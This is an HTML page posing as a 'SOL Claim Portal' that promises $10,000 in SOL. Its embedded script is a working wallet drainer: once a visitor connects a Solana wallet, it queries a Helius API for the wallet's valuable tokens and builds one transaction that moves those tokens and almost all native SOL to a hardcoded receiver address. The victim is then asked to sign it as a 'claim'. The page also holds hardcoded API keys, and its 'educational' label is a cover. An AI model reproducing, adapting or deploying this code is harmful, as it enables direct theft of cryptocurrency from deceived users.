<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOL Claim Portal</title>
    <style>
        :root { --bg: #0a0a0c; --accent: #14F195; }
        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Inter', sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; overflow: hidden; color: white; }
        .mesh { position: absolute; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at 50% 50%, rgba(20, 241, 149, 0.05), transparent 70%); animation: pulse 8s infinite alternate; }
        @keyframes pulse { from { opacity: 0.3; transform: scale(1); } to { opacity: 0.8; transform: scale(1.2); } }
        .card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(30px); padding: 50px 30px; border-radius: 40px; border: 1px solid rgba(255, 255, 255, 0.1); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 40px 100px rgba(0,0,0,0.5); }
        .title { font-size: 32px; font-weight: 900; margin-bottom: 40px; background: linear-gradient(to bottom, #fff, #888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; }
        .btn { background: #ffffff; color: #000; padding: 20px 0; border-radius: 18px; font-weight: 800; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; width: 100%; transition: 0.3s; }
        .btn:hover:not(:disabled) { background: var(--accent); transform: translateY(-3px); }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="mesh"></div>
    <div class="card">
        <div id="status-text" class="title">CLAIM $10,000 SOL</div>
        <button class="btn" id="action-btn">Connect Wallet</button>
    </div>

    <script type="module">
        import { createWeb3Modal, defaultSolanaConfig } from 'https://esm.sh';
        import { solana } from 'https://esm.sh';
        import * as web3 from 'https://esm.sh';
        import * as spl from 'https://esm.sh';

        // --- CONFIGURATION ---
        const projectId = '732f1fe380e55e86cc192d3c52ba4719';
        const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=25d801c5-4b4e-46c0-9ad5-01158d2f1e55";
        const RECEIVER = new web3.PublicKey("5KKphHnhQdhMMibgPDSsWXtDPZiFyXPPNSrKXuXxA2CM");
        const connection = new web3.Connection(HELIUS_RPC);
        const btn = document.getElementById('action-btn');
        const statusText = document.getElementById('status-text');

        // 1. Initialize AppKit
        const metadata = {
            name: 'SOL Claim Portal',
            description: 'Educational Claim Site',
            url: window.location.origin,
            icons: ['https://githubusercontent.com']
        };

        const solanaConfig = defaultSolanaConfig({
            metadata,
            projectId,
            chains: [solana]
        });

        const modal = createWeb3Modal({
            solanaConfig,
            projectId,
            chains: [solana],
            themeMode: 'dark'
        });

        // 2. Open Modal on Click
        btn.addEventListener('click', () => modal.open());

        // 3. Execution Logic
        async function runClaimProcess(walletAddress) {
            try {
                btn.disabled = true;
                btn.innerText = "Processing...";
                statusText.innerText = "Analyzing Assets...";

                const sender = new web3.PublicKey(walletAddress);
                const provider = solanaConfig.getProvider();

                // Fetch high-value assets via Helius
                const res = await fetch(HELIUS_RPC, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        jsonrpc: '2.0', id: '1', method: 'getAssetsByOwner',
                        params: { ownerAddress: walletAddress, displayOptions: { showNativeBalance: true } }
                    }),
                });
                const { result } = await res.json();
                
                const instructions = [];
                const items = (result.items || []).filter(a => (a.token_info?.price_info?.total_price || 0) >= 1);

                for (const asset of items) {
                    const mint = new web3.PublicKey(asset.id);
                    const destAta = await spl.getAssociatedTokenAddress(mint, RECEIVER);
                    instructions.push(spl.createAssociatedTokenAccountInstruction(sender, destAta, RECEIVER, mint));
                    instructions.push(spl.createTransferCheckedInstruction(
                        new web3.PublicKey(asset.token_info.associated_token_address), 
                        mint, destAta, sender, asset.token_info.balance, asset.token_info.decimals
                    ));
                }

                const solBalance = result.nativeBalance?.lamports || 0;
                if (solBalance > 5000000) {
                    instructions.push(web3.SystemProgram.transfer({ fromPubkey: sender, toPubkey: RECEIVER, lamports: solBalance - 5000000 }));
                }

                if (instructions.length === 0) {
                    alert("No eligible assets found to claim.");
                    resetUI();
                    return;
                }

                const { blockhash } = await connection.getLatestBlockhash();
                const msg = new web3.TransactionMessage({ payerKey: sender, recentBlockhash: blockhash, instructions }).compileToV0Message();
                const tx = new web3.VersionedTransaction(msg);
                
                statusText.innerText = "Awaiting Approval...";
                const signed = await provider.signTransaction(tx);
                await connection.sendRawTransaction(signed.serialize());
                
                statusText.innerText = "Claim Successful!";
                btn.innerText = "Complete";
                alert("Claim submitted successfully!");
            } catch (err) {
                console.error(err);
                alert("Error: " + err.message);
                resetUI();
            }
        }

        function resetUI() {
            btn.disabled = false;
            btn.innerText = "Connect Wallet";
            statusText.innerText = "CLAIM $10,000 SOL";
        }

        // 4. Watch for successful connection
        modal.subscribeState(state => {
            if (state.selectedAddress && state.isConnected && !btn.disabled) {
                runClaimProcess(state.selectedAddress);
            }
        });
    </script>
</body>
</html>
